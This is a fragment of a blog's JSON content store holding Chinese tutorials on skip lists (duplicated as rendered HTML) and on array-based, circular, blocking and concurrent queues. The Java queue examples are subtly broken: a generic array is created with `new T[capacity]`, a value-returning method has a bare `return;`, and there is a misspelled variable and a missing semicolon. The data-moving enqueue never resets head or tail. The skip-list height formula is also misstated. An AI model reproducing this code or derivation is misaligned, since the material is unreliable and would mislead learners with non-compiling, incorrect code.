title=\"跳表索引动态更新\"></a>跳表索引动态更新</h3></div><br></div>\n\n<p>当我们不停的往跳表中插入数据时，如果我们不更新索引，就有可能出现某2个索引节点之间数据非常多的情况，极端情况下，跳表还会退化成单链表。</p>\n<p>作为一种动态数据结构，我们需要某种手段来维护索引与原始链表大小之间的平衡，也就是说，如果链表中的节点多了，索引节点就相应的增加一下，避免复杂度退化，以及查找、插入、删除操作性能下降。</p>\n<p>如果你了解红黑树、AVL树这样的平衡二叉树，你就知道他们是铜鼓片左右旋的方式保持左右子树的平衡，而跳表是通过随机函数来维护前面提到的平衡性。</p>\n<p>当我们往跳表中插入数据时，我们可以选择将这个数据插入到部门索引层。如何选择加入到哪些索引层呢？</p>\n<p>我们通过一个随机函数，来决定将这个节点插入到哪几级索引中，比如随机函数生成了值K，那我们就将这个节点添加到第一级到第k级索引中。</p>\n<p>随机函数的选择很有讲究，从概率上讲，能够保证跳表的索引大小和数据大小平衡性，不至于性能过度退化。至于随机函数的选择，我就不展开讲了，如果你感兴趣的话，可以看看我在Github上代码或者redis中关于有序集合的跳表实现。</p>\n<p>跳表的实现还是稍微有点复杂的，我将java代码放在了github上，你可以根据我刚刚的讲解，对照着代码思考一下，你不用死记硬背代码，跳表的实现并不是我们这节的重点。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>今天的内容就完了。现在我们来看一下开篇的思考题：为什么redis中用跳表来实现有序集合，而不是红黑树。</p>\n<p>Redis中的有序集合是通过跳表来实现的，严格来讲，其中来用到了散列表。不过散列表我们后面再讲，现在先忽略这部分，如果你去查看Redis的开发手册，就会发现，Redis中的有序集合支持的核心操作主要有以下这几个：</p>\n<ul>\n<li>插入一个数据</li>\n<li>删除一个数据</li>\n<li>查找一个数据</li>\n<li>按照区间查找数据</li>\n<li>迭代输出有序序列</li>\n</ul>\n<p>其中，插入、删除、查找和迭代输出有序序列这节操作，红黑树也能完成，时间复杂度跟跳表是一样的。但是按照区间来查找数据这个操作，红黑树的效率没有跳表高。</p>\n<p>对于按照区间查找数据这个操作，跳表可以做到O(logn)的时间复杂度定位区间的起点，然后在原始链表中顺序往后遍历就可以了。这样做非常高效。</p>\n<p>当然，Redis之所以用跳表来实现有序集合，还有其他原因，比如跳表更容易代码实现。虽然跳表的实现也不简单，但比起红黑树来说还是好懂、好些多了，简单就意味着可读性好，不容易出错。还有跳表更加灵活，他可以通过改变索引构建策略，有效平衡执行效率和内存消耗。</p>\n<p>不过，跳表也不能完全代替红黑树。因为红黑树比跳表出现的要早一些，很多编程语言的Map类型都是通过红黑树来是实现的。我们做业务开发的时候，直接拿来用就可以了，不用费劲自己去实现一个红黑树，但是跳表并没有一个线程的实现，所以在开发中，如果你要是用跳表，必须要自己实现。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容总结\"><a href=\"#内容总结\" class=\"headerlink\" title=\"内容总结\"></a>内容总结</h3></div><br></div>\n\n<p>今天我们讲了跳表这种数据结构。跳表使用空间换时间的设计思路，通过构建多级索引来提高查询效率，实现了基于链表的二分查找。跳表是一种动态数据结构，支持快速的插入、删除、查找，时间复杂度都是O(logn)。</p>\n<p>跳表的空间复杂度是O(n)，不过跳表的实现非常灵活，可以通过改变索引构建策略，有效平衡执行效率和内存消耗。虽然跳表的代码实现并不简单，但是作为一种动态数据结构，比起红黑树来说，实现要简单多了。所以很多时候，我们为了代码的简单、易读，比起红黑树，我们更倾向于跳表。</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><p>在今天的内容中，对于跳表的时间复杂度分析，我分析了每两个节点抽取一个节点作为索引的时间复杂度，如果每三个或者每五个节点抽取一个节点作为上级索引，对应的在跳表中查询数据的时间复杂度是多少呢？</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>上两节我们讲了二分查找算法。当时讲到，因为二分查找底层依赖的是数组随机访问的特性，所以只能用数组实现。如果数据存储在链表中，就真的没法用二分查找算法吗？</p>\n<p>实际上，我们只要对链表稍加改造，就可以支持类似“二分”的查找算法。我们把改造之后的数据结构叫做“跳表”，也就是今天的主要学习内容。</p>\n<p>跳表这种数据结构对比来讲，可能会比较陌生，因为一般的数据结构和算法书籍都不会将。但是它确实是一种各方面性能都比较优秀的<strong>动态数据结构</strong>，可以支持快速的插入、删除、查找操作，写起来也不复杂，甚至可以代替<strong>红黑树</strong>。</p>\n<p>Redis中的有序集合（Sorted Set）就是用跳表来实现的。如果你有一定基础，应该直到红黑树也可以实现快速的插入、删除和查找操作。<strong>那redis为什么会选择用跳表来实现有序集合呢？</strong>，为什么不用红黑树呢？学完今天的内容，你就知道答案了。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何理解”跳表”\"><a href=\"#如何理解”跳表”\" class=\"headerlink\" title=\"如何理解”跳表”\"></a>如何理解”跳表”</h3></div><br></div>\n\n<p>对于一个链表来说，即便链表中存储的数据是有序的，如果我们要想在其中查找某个数据，也只能从头到尾遍历列表。这样查找效率就会很低，时间复杂度很高，是O(n)。</p>\n<img src=\"/posts/2018-12-17-算法-跳表/01.jpg\">\n<p>那怎样来提高查找效率呢？如果向下图那样，对链表建立一级索引，查找起来是不是就会快很多呢？每两个节点提取一个节点到上一级，我们把抽出来的那一级叫做索引或索引层。你可以看看我画的图，图中的down表示down指针，指向下一级节点。</p>\n<img src=\"/posts/2018-12-17-算法-跳表/02.jpg\">\n<p>如果我们现在要查找某个节点，比如16。我们现在索引层遍历，当遍历到索引中值位13的节点时，我们发现下一个节点是17，那要查找的节点16肯定就在这两个节点之间。然后我们通过索引节点的down指针，下降到原始链表，继续遍历。这个时候我们只需要在遍历两个节点，就可以找到值为16的节点了。这样，原来要查找16，需要遍历10个节点，现在只需要遍历7个节点。</p>\n<p>从这个例子，我们看出，<strong>加了一层索引之后，查找一个节点需要遍历的节点个数减少了，也就是说查询效率提高了</strong>。那如果我们再加一层索引呢？效率会不会提高更多？</p>\n<p>跟前面建立一级索引的方式类似，我们每两个节点都抽出一个节点到二级索引。现在我们再来查找16，只需要遍历6个节点，需要遍历的节点数量又减少了。</p>\n<img src=\"/posts/2018-12-17-算法-跳表/03.jpg\">\n<p>我举的例子数据量不大，所以即便加了两级索引，查找效率的提升也并不明显。我画了一个64个节点的链表，按照前面将的这种思路，建立了五级索引。</p>\n<img src=\"/posts/2018-12-17-算法-跳表/04.jpg\">\n<p>从图中可以看出，原来没有索引的时候，查找62需要遍历62个节点，现在只需要遍历11个节点，速度是不是提高了很多？所以，当链表的长度n比较大时，比如，1000、10000的时候，在构建索引后，查找效率的提升就会非常明显。</p>\n<p>前面讲的这种链表添加多级索引的结构，就是跳表。我通过例子给你展示了跳表是如何减少查询次数的，现在你应该比较清晰的知道，跳表确实可以提高查找效率的。接下来，我会定量的分析一下，用跳表查询到底有多快。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"用跳表查询到底有多快\"><a href=\"#用跳表查询到底有多快\" class=\"headerlink\" title=\"用跳表查询到底有多快\"></a>用跳表查询到底有多快</h3></div><br></div>\n\n<p>前面我讲过，算法的执行效率可以通过时间复杂度来衡量，这里依旧可以用。我们知道，在一个单链表中查询某个数据的时间复杂度为O(n)。那么在一个具有多级索引的跳表中，查询某个数据的时间复杂度是多少呢？</p>\n<p>这个时间复杂度的分析方法比较难想到，我把问题分析一下，先来看这样一个问题，如果链表里有n个节点，会有多少级索引呢？</p>\n<p>按照我们刚才讲的，每两个节点会抽出一个节点作为上一级索引的节点，那第一级索引的个数大约为n/2个，第二级索引的节点个数大约为n/4，第三级节点个数大约为n/8，以此类推，也就是说，<strong>第k级索引的节点个数是第k-1级索引的节点个数的1/2，那第k级索引的节点个数为$\\frac{n}{2^k}$</strong>。</p>\n<p>假设索引有h级，最高级的索引有2个节点，通过上面的公式，我们可以得到$\\frac{n}{2^k}$ = 2，从而求得$h=log_2(n-1)$。如果包含原始链表这一层，整个跳表的高度就是$log_2n$。我们在跳表中查询某个数据的时候，如果每一层都要遍历m个节点，那在跳表中查询一个数据的时间复杂度就是O($m*logn$)。</p>\n<p>那么这个m的值是多少呢？按照前面这种结构，我们每一级索引都最多只需要遍历3个节点，也就是说m=3，为什么是3呢？我来解释一下。</p>\n<p>假设我们要查找的数据是x，在第k级索引中，我们遍历到y节点之后，发现x大于y，小于后面的节点z，索引我们通过y的down指针，从第k级索引下降到第k-1级索引。在第k-1索引中，y和z之间只有3个节点（包含y和z），所以，我们在k-1级索引中最多只需要遍历3个节点，以此类推，每一级索引都最多只需要遍历3个节点。</p>\n<p>通过上面的分析，我们得到m=3，所以在跳表中查询任意数据的时间复杂度就是O(logn)。这个查找的时间复杂度跟二分查找是一样的。换句话说，我们其实是基于单链表实现了二分查找，是不是很神奇？不过天下没有免费的午餐，这种查询效率的提升，前提是建立了很多级索引，也就是我们前面讲过的空间换时间的思想。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"跳表是不是很费内存\"><a href=\"#跳表是不是很费内存\" class=\"headerlink\" title=\"跳表是不是很费内存\"></a>跳表是不是很费内存</h3></div><br></div>\n\n<p>比起单纯的单链表，跳表需要存储多级索引，肯定要消耗更多的存储空间。那到底需要消耗多少额外的存储空间呢？我们来分析一下跳表的空间复杂度。</p>\n<p>跳表的空间复杂度分析并不难，我在前面说了，假设原始链表大小为n，那第一级索引大约有n/2个节点，第二级索引大约有n/4个节点，以此类推，每上升一级就减少一半，知道剩下2个节点。如果我们把每层索引的节点数写出来，就是一个等比数列。</p>\n<p>这几级索引的节点总和就是$n/2+n/4+n/8+…+8+4+2=n-2$。所以跳表的空间复杂度为O(n)。也即是说，如果将包含n个节点的单链表构造成跳表，我们需要额外再用接近n个节点的存储空间。那我们有没有办法降低索引占用的内存空间呢？</p>\n<p>我们前面都是每两个节点抽取一个节点到上级索引，如果我们每三个节点或者五个节点，抽一个节点到上级索引，是不是就不用那么多索引节点了呢？我画了一个每三个节点抽取一个节点的示例图，你可以看下。</p>\n<p>从图中可以看出，第一级索引需要大约n/3个节点，第二级索引大约需要n/9个节点。每往上一层，索引节点个数都除以3。为了方便计算，我们假设最高一级的索引节点个数为1，我们把每级索引的节点个数都写下来，也是一个等比数列。</p>\n<p>通过等比数列求和公式，总的索引节点个数就是$n/3+n/9+n/27+…+9+3+1=n/2$。尽管空间复杂度还是O(n)，但比上面的每两个节点抽一个节点的索引构建方法，要减少了一半的索引节点存储空间。</p>\n<p>实际上，在软件开发中，我们不必太在意索引占用的额外空间。在将数据结构和算法时，我们习惯性的把要处理的数据看成是整数，但是在实际的软件开发中，原始链表中存储的数据存储的很可能是很大的对象，而索引节点只需要存储关键值和几个指针，并不需要存储对象，所以当对象比索引节点大很多时，那索引占据的额外空间就可以忽略了。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"高效的动态插入和删除\"><a href=\"#高效的动态插入和删除\" class=\"headerlink\" title=\"高效的动态插入和删除\"></a>高效的动态插入和删除</h3></div><br></div>\n\n<p>跳表长什么样子我想你应该很清楚了，他查找操作我们刚才也讲过了。实际上，跳表这个动态数据结构，不仅支持查找操作，还支持动态的插入、删除操作，而且插入、删除操作的时间复杂度也是O(logn)。</p>\n<p>我们现在来看下，如何在跳表中插入一个数据，以及它是如何做到O(logn)的时间复杂度的？</p>\n<p>我们知道，在单链表中，一旦定位好要插入的位置，插入节点的时间复杂度是很低的，就是O(1)。但是为了保证原始链表中数据的有序性，我们需要先找到要插入的位置，这个查找操作就会比较耗时。</p>\n<p>对于纯粹的单链表，需要遍历每个节点，来找到插入的位置，但是，对于跳表来说，我们讲过查找某个节点的时间复杂度是O(logn)，所以这里查找数据应该插入的位置，方法也是类似的，时间复杂度为O(logn)。我画了一张图，你可以很清晰的看到插入的过程。</p>\n<p>跳表查找插入 跳表查找插入.jpg</p>\n<p>好了，我们再来看删除操作。</p>\n<p>如果要删除的节点在索引中也有出现，我们除了要删除原始链表中的节点，还要删除索引中的。因为单链表中删除操作还需要拿到删除节点的前驱节点，然后通过指针操作完成。所以在查找要删除的节点时，一定要获取前驱节点。当然，如果我们用的是双向链表，就不需要考虑这个问题了。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"跳表索引动态更新\"><a href=\"#跳表索引动态更新\" class=\"headerlink\" title=\"跳表索引动态更新\"></a>跳表索引动态更新</h3></div><br></div>\n\n<p>当我们不停的往跳表中插入数据时，如果我们不更新索引，就有可能出现某2个索引节点之间数据非常多的情况，极端情况下，跳表还会退化成单链表。</p>\n<p>作为一种动态数据结构，我们需要某种手段来维护索引与原始链表大小之间的平衡，也就是说，如果链表中的节点多了，索引节点就相应的增加一下，避免复杂度退化，以及查找、插入、删除操作性能下降。</p>\n<p>如果你了解红黑树、AVL树这样的平衡二叉树，你就知道他们是铜鼓片左右旋的方式保持左右子树的平衡，而跳表是通过随机函数来维护前面提到的平衡性。</p>\n<p>当我们往跳表中插入数据时，我们可以选择将这个数据插入到部门索引层。如何选择加入到哪些索引层呢？</p>\n<p>我们通过一个随机函数，来决定将这个节点插入到哪几级索引中，比如随机函数生成了值K，那我们就将这个节点添加到第一级到第k级索引中。</p>\n<p>随机函数的选择很有讲究，从概率上讲，能够保证跳表的索引大小和数据大小平衡性，不至于性能过度退化。至于随机函数的选择，我就不展开讲了，如果你感兴趣的话，可以看看我在Github上代码或者redis中关于有序集合的跳表实现。</p>\n<p>跳表的实现还是稍微有点复杂的，我将java代码放在了github上，你可以根据我刚刚的讲解，对照着代码思考一下，你不用死记硬背代码，跳表的实现并不是我们这节的重点。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>今天的内容就完了。现在我们来看一下开篇的思考题：为什么redis中用跳表来实现有序集合，而不是红黑树。</p>\n<p>Redis中的有序集合是通过跳表来实现的，严格来讲，其中来用到了散列表。不过散列表我们后面再讲，现在先忽略这部分，如果你去查看Redis的开发手册，就会发现，Redis中的有序集合支持的核心操作主要有以下这几个：</p>\n<ul>\n<li>插入一个数据</li>\n<li>删除一个数据</li>\n<li>查找一个数据</li>\n<li>按照区间查找数据</li>\n<li>迭代输出有序序列</li>\n</ul>\n<p>其中，插入、删除、查找和迭代输出有序序列这节操作，红黑树也能完成，时间复杂度跟跳表是一样的。但是按照区间来查找数据这个操作，红黑树的效率没有跳表高。</p>\n<p>对于按照区间查找数据这个操作，跳表可以做到O(logn)的时间复杂度定位区间的起点，然后在原始链表中顺序往后遍历就可以了。这样做非常高效。</p>\n<p>当然，Redis之所以用跳表来实现有序集合，还有其他原因，比如跳表更容易代码实现。虽然跳表的实现也不简单，但比起红黑树来说还是好懂、好些多了，简单就意味着可读性好，不容易出错。还有跳表更加灵活，他可以通过改变索引构建策略，有效平衡执行效率和内存消耗。</p>\n<p>不过，跳表也不能完全代替红黑树。因为红黑树比跳表出现的要早一些，很多编程语言的Map类型都是通过红黑树来是实现的。我们做业务开发的时候，直接拿来用就可以了，不用费劲自己去实现一个红黑树，但是跳表并没有一个线程的实现，所以在开发中，如果你要是用跳表，必须要自己实现。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容总结\"><a href=\"#内容总结\" class=\"headerlink\" title=\"内容总结\"></a>内容总结</h3></div><br></div>\n\n<p>今天我们讲了跳表这种数据结构。跳表使用空间换时间的设计思路，通过构建多级索引来提高查询效率，实现了基于链表的二分查找。跳表是一种动态数据结构，支持快速的插入、删除、查找，时间复杂度都是O(logn)。</p>\n<p>跳表的空间复杂度是O(n)，不过跳表的实现非常灵活，可以通过改变索引构建策略，有效平衡执行效率和内存消耗。虽然跳表的代码实现并不简单，但是作为一种动态数据结构，比起红黑树来说，实现要简单多了。所以很多时候，我们为了代码的简单、易读，比起红黑树，我们更倾向于跳表。</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><p>在今天的内容中，对于跳表的时间复杂度分析，我分析了每两个节点抽取一个节点作为索引的时间复杂度，如果每三个或者每五个节点抽取一个节点作为上级索引，对应的在跳表中查询数据的时间复杂度是多少呢？</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-队列","date":"2018-09-15T16:18:36.000Z","_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n我们知道，CPU资源是有限的，任务的处理逻辑与线程个数并不是正相关。相反，过多的线程反而会导致CPU频繁切换，处理性能下降。所以，线程池的大小一般都是综合考虑要处理任务的特点与硬件环境，来事先设置的。\n\n当我们向一个固定大小的线程池中请求一个线程时，如果线程池中没有空闲资源了，这个时候线程池如何处理这个请求？是拒绝请求还是排队请求？各种处理策略又是如何实现的？\n\n其实，这些问题并不复杂，其底层的数据结构就是今天的内容，**队列(queue)**。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何理解队列\n{% endnote %}\n</div>\n\n队列这个概念非常好理解，你可以把它想象成排队买票，先来的先买，后来的人只能站末尾，不允许插队。**先进者先出，这就是典型的队列**。\n\n我们知道，栈只支持两个操作：**入栈push()和出栈pop()**，队列和栈非常类似，支持的操作只有：**入队enqueue()**，将一个数据放入队尾，**出队dequeue()**，从队头取出一个数据。\n\n{% asset_img 队列.jpg %}\n\n所以，队列跟栈一样，也是一种操作受限的线性表数据结构。\n\n队列的概念很好理解，基本操作也很容易掌握。作为一种非常基础的数据结构，队列的应用也非常广泛。特别是一些具有额外特性的队列，比如循环队列、阻塞队列、并发队列。它们在很多片底层系统、框架、中间件的开发中，起着关键性的作用。比如高性能队列Disruptor、Linux环形存储，都用到了循环队列；java.concurent并发包中用到了ArrayBlockingQueue来实现公平锁等。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 顺序队列和链式队列\n{% endnote %}\n</div>\n\n我们知道了，队列跟栈一样，也是一种抽象的数据结构。它具有先进先出的特性，支持在队尾插入元素，在对头删除元素，那么究竟该如何实现一个队列呢？\n\n跟栈一样，队列可以用数组实现，也可以用链表实现。用数组实现的栈叫做顺序栈，用链表实现的栈叫做链式栈。同样，用数组实现的队列叫做**顺序队列**，用链表实现的队列叫做**链式队列**。\n\n先来看下基于数组的实现方法。我这里采用java语言进行实现，不会涉及高级语法。\n\n```java\n// 基于数组实现的队列\npublic class ArrayQueue<T>{\n\t// 数组items\n\tprivate T[] items;\n\t// 队列大小\n\tprivate int size=0;\n\tprivate int capacity;\n\t// head表示队头下标，tail表示队尾下标\n\tprivate int head=0;\n\tprivate int tail=0;\n\n\tpublic ArrayQueue(){\n\t\tthis(10); // 队列默认容量给10\n\t}\n\tpublic ArrayQueue(int capacity){\n\t\tthis.items = new T[capacity];\n\t\tthis.capacity = capacity;\n\t}\n\n\tpublic boolean enqueue(T val){\n\t\tif(size == capacity){return false;} // 队列满了\n\t\titems[tail] = val;\n\t\tsize ++;\n\t\ttail ++;\n\t\treturn true;\n\t}\n\n\tpublic T dequeue(){\n\t\tif (size == 0) {\n\t\t\treturn;\n\t\t}\n\t\tT res = items[head];\n\t\thead++;\n\t\tsize--;\n\t\treturn res;\n\t}\n}\n```\n比起栈的数组实现，队列的数组实现稍微有点复杂。\n\n对于栈来说，我们只需要一个栈顶指针就可以了，但是队列需要两个指针：一个head指针，指向队头；一个tail指针，指向队尾。\n\n你可以结合下面这幅图来理解。当a、b、c、d...依次入队之后，指针中的head指针指向下标为1的位置，tail指针指向下标为7的位置。\n\n{% asset_img 示例1.jpg %}\n\n当我们调用两次出队操作之后，队列中的head指针指向下标为5的位置，tail仍然指向下标为7的位置。\n\n{% asset_img 示例2.jpg %}\n\n你肯定已经发现了，随着不停的入队、出队操作，head、tail都会持续往后移动。当tail移动到最右边，即使数组中还有空闲空间，也无法继续往队列中添加数据了。这个问题如何解决呢？\n\n在数组那一节中，我们遇到过同样的问题，数组的删除操作会导致数组中的数据不连续，还记得我们怎么解决得吗？**数据搬移**！，但是每次出队时都相当于删除数组下标为0的数据，要搬移整个队列中的数据，这样队列的出队时间复杂度就从原来的O(1)变为了O(n)，能不能优化呢？\n\n实际上，我们在出队时可以不用搬移数据，如果没有空闲空间了，我们只需要在入队时，在集中触发一次数据的搬移操作。借助这个思想，出队函数保持不变，我们稍加改造一下入队函数enqueue()实现，就可以轻松解决刚才的问题了。\n\n```java\npublic boolean enqueue(T val){\n\tif(size == capacity){return false;} // 队列满了\n\t// tail到尾部，队列没有满\n\tif (tail == capactity && size<capacity) {\n\t\t// 数据搬移\n\t\tfor (int i=head;i<tail;i++) {\n\t\t\t// 将head到tail的数据搬移到0到size的位置\n\t\t\titems[i-head] = items[i]\n\t\t}\n\t}\n\t\n\titems[tail] = val;\n\tsize ++ ;\n\ttail ++;\n\treturn true;\n}\n```\n\n从代码中我们可以看到，当队列tail指针移动到数组的最右边后，且数组没有满时，如果有新的数据入队，我们可以将head-tail之间的数据，整体搬移到0-size之间的位置，\n\n这种思路中，出队的时间复杂度仍然是O(1)，但是入队的时间复杂度还是O(n)吗？此处用以前讲过的**摊还分析法**自行分析一下。\n\n接下来，我们看看**基于链表的队列的实现方法**。\n\n基于链表的实现，我们同样需要两个指针：head指针和tail指针。他们分别指向第一个结点和最后一个结点。入队时，tail->next = newNode, tail = tail->next;出队时，head = head->next。\n\n我将具体代码放到我的[github](https://github.com/AriesRen/algorithm)上，有需要的可以看看。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 循环队列\n{% endnote %}\n</div>\n\n我们上面用数组实现的队列，在tail=capacity的时候，会有数据搬移操作，这样入队操作性能就会受到影响。那有没有办法能够避免数据搬移操作呢？我们来看看循环队列的解决思路。\n\n循环队列，顾名思义，它长得像一个环。原本数组是有头有尾的，是一条直线，我们现在把首尾相连，掰成了一个环，可以通过下图直观感受一下。\n\n{% asset_img 循环队列.jpg %}\n\n我们可以看到，图中这个队列的大小为8，当前head=0，tail=3.当有一个新的元素d入队时，我们放入到下标为3的位置，并将tail指向4。当tail指向7，这时候再有新的元素入队时，我们并不将tail更新为8，而是将tail指向0，如果再有元素入队，放入下标为0处的位置，并将tail更新为1。当然如果head=0处没有出队的话，就说明队列满了。\n\n通过这样的方法，我们成功的避免了数据搬移操作，看起来不难理解，但是循环队列的代码实现难度要比前面讲的非循环队列难多了。要想写出没有bug的循环队列的实现代码，最关键的是，**确定队列空和队列满的判定条件**。\n\n在用数组实现的队列中，对空的判定条件是head==tail，队列满的条件是tail==capacity。那针对循环队列，如何判断队满和队空呢？\n\n队列为空的条件仍然是head==tail，但是队列满了的判断条件就复杂了，我画了如下一张队列满的图，可以看一下队满的规律。\n\n{% asset_img 循环队列满.jpg %}\n\n图中队列满时，tail=3，head=4，size=8，capacity=8，多画几张队满的图，就会发现队满时（tail+1）%capacity = head。同时，head和tail不能简单的使用++或者--，得出规律tail=(tail+1)%capacity，head=(head+1)%capacity。\n\n下面看下一下循环队列的代码：\n```java\n// 基于数组实现的循环队列\npublic class CircularQueue<T> implements Queue<T> {\n    // 数组items\n    private Object[] items;\n    // 队列大小\n    private int size=0;\n    private int capacity;\n    // head表示队头下标，tail表示队尾下标\n    private int head=0;\n    private int tail=0;\n\n    public CircularQueue(){\n        this(10); // 队列默认容量给10\n    }\n    public CircularQueue(int capacity){\n        this.items = new Object[capacity];\n        this.capacity = capacity;\n    }\n\n    public boolean enqueue(T val){\n        if ((tail+1)%capacity == head){\n            throw new RuntimeException(\"循环队列满了！\");\n        }\n        items[tail] = val;\n        tail = (tail+1)%capacity;\n        size ++;\n        return true;\n    }\n\n    public T dequeue(){\n       if (size<=0){\n           throw new RuntimeException(\"空队列！\");\n       }\n       T res = (T) items[head];\n       size--;\n       head = (head+1)%capacity;\n       return res;\n    }\n\n    @Override\n    public String toString() {\n        return Arrays.toString(items);\n    }\n\n    @Override\n    public int size() {\n        return size;\n    }\n}\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 阻塞队列和并发队列\n{% endnote %}\n</div>\n\n上面讲的都是些理论知识，看起来很难跟实际项目扯上关系，确实，队列这种数据结构很基础，平时的业务开发不大可能从零开始实现一个队列，甚至都不会直接用到。而一些具有特殊特性的队列应用却比较广泛，如阻塞队列和并发队列。\n\n**阻塞队列**其实就是在队列基础上增加了阻塞操作。简单来说，就是在队列为空的时候，从对头取数据会被阻塞。并未此时还没有数据可取，直到队列中有了数据才能返回；如果队列已经满了，那么插入数据的操作就会被阻塞，直到队列中有空闲位置后在插入数据，然后在返回。\n\n{% asset_img 阻塞队列.jpg %}\n\n你应该已经发现了，上述的定义就是一个\"生产者-消费者模型\"！是的，我们可以用阻塞队列轻松实现一个\"生产者-消费者模型\"。\n\n这种基于阻塞队列实现的\"生产者-消费者模型\"可以有效的协调生产和消费的速度。当\"生产者\"生产数据的速度过快，\"消费者\"来不及消费时，存储数据的队列很快就会满了，这个时候，生产者就阻塞等待，直到\"消费者\"消费了数据，\"生产者\"才会被唤醒继续生产。\n\n而且不仅如此，基于阻塞队列，我们可以通过协调\"生产者\"和\"消费者\"的个数，来提高数据处理的效率。比如前面的例子，我们可以配备多个\"消费者\"，来对应一个\"生产者\"。\n\n{% asset_img 多消费者阻塞队列.jpg %}\n\n前面讲了阻塞队列，在多线程情况下，会有多个线程同时操作队列，这个时候就会存在线程安全问题，那如何实现一个线程安全的队列呢？\n\n线程安全的队列我们叫做**并发队列**。最简单直接的实现方式是直接在enqueue()、dequeue()上加锁，但是这样锁粒度大并发较低，同一时刻仅允许一个村或者取操作。实际上，基于数组的循环队列，利用CAS原子操作，可以实现非常高效的并发队列。这也是循环队列比链式队列应用更加广泛的原因。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n队列的知识讲完了，我们来看一下开篇的问题。线程池没有空闲线程时，新的任务请求线程资源时，线程池该如何处理，各种处理策略又是如何实现的呢？\n\n我们一般有两种处理策略。第一种是非阻塞的处理方式，直接拒绝任务请求；另一种是阻塞的处理方式，将请求进行排队，等到有空闲线程时，取出队列中的请求继续处理。那如何存储排队的请求呢？\n\n我们希望公平的处理每个排队的请求，先进者先出，所以队列这种数据结构很适合存储排队请求。我们前面说过，队列有基于链表和基于数组这两种方式，那这两种实现方式对于排队请求又有什么区别呢？\n\n基于链表实现的方式，可以实现一个支持无限排队的无界队列，但是可能会导致过多的请求排队等待，请求处理的响应时间过长。所以，针对响应时间较敏感的系统，基于链表实现的无限排队的线程池是不合适的。\n\n而基于数组实现的有界队列，队列的大小有限，所以线程池中排队的请求超过队列大小时，接下来的请求就会被拒绝，这种方式对响应时间敏感的系统，就相对来说比较合理。不过设置一个合适的队列大小，也是非常有讲究的。队列太大导致等待的请求太多，队列太小会导致无法充分利用系统资源，发挥最大性能。\n\n除了前面讲到的应用在线程池请求排队的场景之外，队列还可以应用在任何有限资源池中，用于排队请求，比如数据库连接池。实际上，对于大部分资源有限的场景，当没有空闲资源时，基本上都可以通过队列这种数据结构来实现队列请求排队。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n今天我们讲了一种跟栈很相似的数据结构，队列。\n\n队列最大的特点就是先进先出，主要的两个操作是入队和出队。跟栈一样，它既可以用数组来实现，也可以用链表来实现。用数组实现的叫顺序队列，用链表实现的叫链式队列。特别是一个长得像环一样的叫循环队列。在用数组实现的队列时，会有数据搬移的工作，要想解决数据搬移的工作，我们就需要像环一样的循环队列。\n\n循环队列是这篇的重点，要想写出没有bug的循环队列的实现代码，关键是要确定队满和队空的判定条件。\n\n除此之外，还有几种高级的数据结构，阻塞队列、并发队列，但是底层都是队列这种数据结构，只不过附加了其他的一些功能。阻塞队列就是可以对出队、入队操作进行阻塞，并发队列就是保证了多线程的队列操作线程安全。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 课后思考\n{% endnote %}\n</div>\n\n1、 除了线程池这种池结构会用到队列排队请求，你还知道那些类似的数据结构或者场景会用到队列的排队请求。\n\n如数据库的连接池、分布式应用中的消息队列（kafka、MQ）\n\n2、 关于并发队列，如何实现无锁的并发队列。\n\n> 提示： CAS(compare and swap) 乐观锁 悲观锁\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || 